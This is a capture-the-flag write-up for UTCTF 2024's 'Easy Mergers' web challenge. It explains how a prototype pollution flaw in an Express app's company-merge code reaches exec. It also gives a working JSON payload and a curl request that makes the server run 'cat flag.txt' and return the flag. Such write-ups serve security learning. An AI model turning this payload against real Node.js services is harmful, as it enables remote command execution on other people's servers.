---
title: "Easy Mergers - UTCTF 2024"
category: "web"
subcategory: "prototype-pollution"
type: "writeup"
tags: ["web", "prototype-pollution", "exec", "easy", "mergers", "utctf", "utctf-2024", "2024", "ctf-writeup"]
summary: "![Zimzi's avatar](https://substack.com/@zimzi)"
source:
  name: "CTFtime writeup #38994"
  url: "https://ctftime.org/writeup/38994"
original_source: "https://zimzi.substack.com/p/utctf-2024-easy-mergers-v01"
ctf:
  name: "UTCTF 2024"
  year: 2024
  challenge: "Easy Mergers"
---

## Metadata

- **CTF:** UTCTF 2024
- **Task:** Easy Mergers
- **Author team:** Zimzi
- **CTFtime tags:** web, prototype-pollution
- **CTFtime:** <https://ctftime.org/writeup/38994>
- **Original writeup:** <https://zimzi.substack.com/p/utctf-2024-easy-mergers-v01>

---
# UTCTF 2024: Easy Mergers v0.1

[![Zimzi's avatar](https://substackcdn.com/image/fetch/$s_!7J0a!,w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fba6ea3a0-f2af-45ce-9f5d-82bf420f4890_1024x1024.png)](https://substack.com/@zimzi)

[Zimzi](https://substack.com/@zimzi)

Apr 04, 2024

Share

[![](https://substackcdn.com/image/fetch/$s_!h5Xu!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F54ba3565-902d-4f51-aca7-bf33032e6d35_528x507.png)](https://substackcdn.com/image/fetch/$s_!h5Xu!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F54ba3565-902d-4f51-aca7-bf33032e6d35_528x507.png)

The task includes 

  * a link to a webpage:

[![](https://substackcdn.com/image/fetch/$s_!Rbvz!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4e1a053e-fb94-4861-874b-7281dc244206_790x441.png)](https://substackcdn.com/image/fetch/$s_!Rbvz!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4e1a053e-fb94-4861-874b-7281dc244206_790x441.png)


  * source code with source code:

    * `app.js` with an Express app that contains functions that make requests to API to:

      * make a company (`/api/makeCompany`)

      * merge a company (`/api/absorbCompany/:cid`)

      * get all companies (`/api/getAll`)

    * `flag.txt` with a flag,

    * `merger.js` with code used by `app.js` to merge two company objects,

    * `merger.sh` with just echos commands.


Thanks for reading Zimzi’s Substack! Subscribe for free to receive new posts and support my work.

# App overview

## Company creation

First, when we analyse `/api/makeCompany`. We see that the code creates an empty company object `cObj` followed by iterating over attributes and values from raw `req.body` called `data`. Next, it just assigns attributes to values from our `data` into `cObj`, which means a user has full control over it.

```
    **let cObj = new Object();**
    for (let j = 0; j < Math.min(data.attributes.length, data.values.length); j++) {
        if (data.attributes[j] != '' && data.attributes[j] != null) {
          **cObj[data.attributes[j]] = data.values[j];**
    }
```

Hm… we’ve seen this pattern before. This vulnerability is called**prototype pollution**. In my previous [article](https://zimzi.substack.com/i/138158643/prototype-pollution), I described in detail how it works. 

What I want to highlight:

  1. an object has the **default** property `__proto__**`** ,

  2. we have **control over assigning attributes and values** like `cObj[data.attributes[j]] = data.values[j]`, 


so prototype pollution seems quite likely. 

If we see a similar pattern, it should always light a red lightbulb**i** n our heads.

[![](https://substackcdn.com/image/fetch/$s_!MsXG!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbec0d4b4-e5fb-4550-b1ef-96a7babf1d6f_1024x1024.png)](https://substackcdn.com/image/fetch/$s_!MsXG!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbec0d4b4-e5fb-4550-b1ef-96a7babf1d6f_1024x1024.png)

Let’s create a company using a webpage GUI.

  1. We navigate to the form …


[![](https://substackcdn.com/image/fetch/$s_!hY7D!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffe99dd2e-8b8d-423d-82ed-6a9b04bc84c7_457x113.png)](https://substackcdn.com/image/fetch/$s_!hY7D!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffe99dd2e-8b8d-423d-82ed-6a9b04bc84c7_457x113.png)

  2. and enter company data and click the `Create Company` button


[![](https://substackcdn.com/image/fetch/$s_!Oe2t!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb4445d9b-4ae6-4343-b6be-b11ff901fd9f_496x230.png)](https://substackcdn.com/image/fetch/$s_!Oe2t!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb4445d9b-4ae6-4343-b6be-b11ff901fd9f_496x230.png)

3\. The company was created successfully. We repeat a company creation process one more time. In total, we have two records. As we see, every company get an id called `cid`.

[![](https://substackcdn.com/image/fetch/$s_!2Bol!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd4d8ca4f-6283-4e82-bb8e-8ec21161887a_493x104.png)](https://substackcdn.com/image/fetch/$s_!2Bol!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd4d8ca4f-6283-4e82-bb8e-8ec21161887a_493x104.png)

## Company merge

We can use the GUI to merge a new company (`cid 3`) with a second on the list company (`cid 1`).

[![](https://substackcdn.com/image/fetch/$s_!_MbC!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6f8cdf74-7910-41e9-99ac-5e1c290ae4e9_775x358.png)](https://substackcdn.com/image/fetch/$s_!_MbC!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6f8cdf74-7910-41e9-99ac-5e1c290ae4e9_775x358.png)

Let’s take a look at the function requesting endpoint '/api/absorbCompany/:cid' to merge the company. We need to get a `cid` of the company that we want to merge into. Similarly, like in company creation, we get `data` from `req.body`. Next, we create a child process for the file `merger.js` with fork function (under the hood fork [system call](https://en.wikipedia.org/wiki/System_call)).

```
    let child = cp.fork("merger.js");
```

Open a communication channel between `app.js` and `merger.js`, enabling the data flow of merging companies implemented by the method `some_process.send`. We can call the `app.js` parent process and the `merger.js` child process. The parent sends data companies' data to `meger.js` as follows:

```
    let dataObj = new Object()
    dataObj.data = data; _< - new company_
    dataObj.orig = userCompanies[req.session.uid][cid] _< - company to merge to_
    child.send(dataObj);
```

At this stage, we should look at the child process because it includes the most important parts of the code.

A the beginning of the file, the `exec` function import is included. Probably it will be useful in exploitation because it enables the execution of system commands. What’s more, we get an output from the execution of the `exec` in the parent process that handles the POST request ( retObj - > res.end(JSON.stringify(m)). 

The usage of `exec` also seems promising as a user may have control over `secret.cmd`.

```
    var secret = {}
    …
    if (secret.cmd != null) {
            **cmd = secret.cmd;**
    }
    
    var test = **exec(cmd, (err, stdout, stderr)** => {
            retObj = {};
            retObj['merged'] = orig;
            retObj['err'] = err;
            retObj['stdout'] = stdout;
            retObj['stderr'] = stderr;
            process.send(retObj);
    });
```

## Next prototype pollution

The prototype pollution is also present in child process in the fragment of code presented below. 

It’s time to light a red lightbulb again…

[![](https://substackcdn.com/image/fetch/$s_!MsXG!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbec0d4b4-e5fb-4550-b1ef-96a7babf1d6f_1024x1024.png)](https://substackcdn.com/image/fetch/$s_!MsXG!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fbec0d4b4-e5fb-4550-b1ef-96a7babf1d6f_1024x1024.png)

If we add `cmd` to the proto `orig`, it will be present in nearly all objects, so may be able to read `flag.txt`. The objects that already have the given attribute won’t be overwritten. Fortunately, we start with an empty `secret` object (var secret = {}). 

```
    let data = m.data;
    let orig = m.orig;
    for (let k = 0; k < Math.min(data.attributes.length, data.values.length); k++) {
    
    if (!(orig[data.attributes[k]] === undefined) && isObject(orig[data.attributes[k]]) && isObject(data.values[k])) {
                for (const key in data.values[k]) {
                    
    **orig[data.attributes[k]][key] = data.values[k][key];** _< - potienial entry point for protoype pollution
    _
                }
    } else if (!(orig[data.attributes[k]] === undefined) && Array.isArray(orig[data.attributes[k]]) && Array.isArray(data.values[k])) {
    
    **orig[data.attributes[k]] = orig[data.attributes[k]].concat(data.values[k]);** _< - potienial entry point for protoype pollution
    _
            } else {
    
    **orig[data.attributes[k]] = data.values[k];** _< - potential entry point for prototype pollution
    _
            }
    }
```

The code has many potential entry points for prototype pollution. Let’s make a plan for how actually to pollute `secret`.

## Exploit

A payload that pollutes `secret` with `cmd` attribute equal `cat flag.txt` through prototype looks like this:

Text within this block will maintain its original spacing when published

```
    **SOME_OBJECT.__proto__.cmd = `cat flag.txt`**
```

We need to translate it into the actual request.

The execution on command (`exec`) is executed only in the case of merging companies. The merging process is made by POST request, which requires the below parameters:

  * `cid` - id of the company we merge to (included in URL query params)

  * values and attributes for a new company (included in post body in JSON format like {"attributes": ["x","z","a"],"values": ["y","w","b"]} )


The code presented in previous section with potential prototype pollution have 3 cases when it can deal with objects, arrays or otherwise. 

In the first “object” case, we add attributes corresponding to values from the new company for the old one.

```
    or (let k = 0; k < Math.min(data.attributes.length, data.values.length); k++) {
    	  …
    	if (!(orig[data.attributes[k]] === undefined) && isObject(orig[data.attributes[k]]) && isObject(data.values[k])) {
                for (const key in data.values[k]) {
    
     for (const key in data.values[k]) {
                    orig[data.attributes[k]][key] = data.values[k][key];  
              }
         }
              …
    }
```

Let’s check if we can craft the payload:

  1. isObject(orig[data.attributes[k]]) 


When data.attributes[k] equals “proto” for orig[“__proto__”] is indeed an object.

  2. isObject(data.values[k])


When data.values[k] equals {"cmd": "cat flag.txt"} is also object.

  3. orig[data.attributes[k]][key] = data.values[k][key]


When replacing variables with our data orig[“__proto__”][cmd] equals “cat flag.txt”. We receive**** the payload we exactly look for (SOME_OBJECT.__proto__.cmd = `cat flag.txt`).

At this point, we can conduct the exploit.

  1. The company represented by object `orig` is an arbitrary company created with a GUI option. 

[![](https://substackcdn.com/image/fetch/$s_!NAhw!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fac16d979-a6f9-40a0-92fd-9c6aee3c0c65_525x250.png)](https://substackcdn.com/image/fetch/$s_!NAhw!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fac16d979-a6f9-40a0-92fd-9c6aee3c0c65_525x250.png)

  2. The merging company need to include payload with proto. Let’s translate it into JSON data: {"attributes":["__proto__"],"values":[{"cmd": "cat flag.txt"}]}


We use CURL for this request because GUI mess with payload by quoting the object curly brackets:

```
    curl 'http://guppy.utctf.live:8725/api/absorbCompany/0' \
      -H 'Accept: */*' \
      -H 'Accept-Language: en-GB,en;q=0.9,fr-MC;q=0.8,fr;q=0.7,en-US;q=0.6' \
      -H 'Cache-Control: no-cache' \
      -H 'Connection: keep-alive' \
      -H 'Content-Type: application/json' \
      -H 'Cookie: connect.sid=xxx' \
      -H 'DNT: 1' \
      -H 'Origin: http://guppy.utctf.live:8725' \
      -H 'Pragma: no-cache' \
      -H 'Referer: http://guppy.utctf.live:8725/' \
      -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36' \
      **--data-raw $'{"attributes":["__proto__"],"values":[{"cmd" : "cat flag.txt"}]}'** \    
      --compressed \
      --insecure
```

In response we receive the response from `exec` function with the flag:

{"merged":{"OLD_COMPANY":"midnight","cid":3},"err":null,"stdout":"utflag{p0lluted_b4ckdoorz_and_m0r3}","stderr":""}

[![](https://substackcdn.com/image/fetch/$s_!gUYx!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1b343242-9bb0-47d5-92e4-cfc8e47e320e_1600x914.png)](https://substackcdn.com/image/fetch/$s_!gUYx!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1b343242-9bb0-47d5-92e4-cfc8e47e320e_1600x914.png)

Happy prototype pollution! Bye!

Thanks for reading Zimzi’s Substack! Subscribe for free to receive new posts and support my work.

Share
